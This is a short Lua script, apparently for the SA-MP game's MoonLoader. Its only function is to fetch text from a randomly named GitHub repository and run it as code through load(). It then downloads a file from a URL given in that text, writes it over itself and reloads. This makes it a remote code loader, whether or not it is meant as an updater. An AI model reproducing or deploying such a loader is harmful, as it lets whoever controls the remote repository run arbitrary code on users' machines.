script_version('1.0.0')
requests = require 'requests'
encoding = require("encoding"); encoding.default = 'CP1251'; u8 = encoding.UTF8  

function main()
	while not isSampAvailable() do wait(0) end
	sampAddChatMessage('.....Sam0g0000nwik....')
	local RAW = 'https://raw.githubusercontent.com/gfdgdfsgsdfgsdfg432/gfdgdfsgsdfgsdfg432/main/ubdate.ini' -- RAW обновы
	local r = requests.get(RAW) 
		if r.status_code == 200 then -- проверяем status code RAW'a
		local func,err = load('return '..r.text) 
		if err == nil then -- 
			if thisScript().version ~= func().version then 
				
				for l in func().description:gmatch('[^\n]+') do
					
				end
				
					downloadUrlToFile(func().url, 
						thisScript().path, 
						function(id, status, p1, p2)
							if status == 58 then 
								
								thisScript():reload() 
							else
								
							end
						end
					)

			end
		else
			
		end
	else
		
	end
	wait(-1)
end
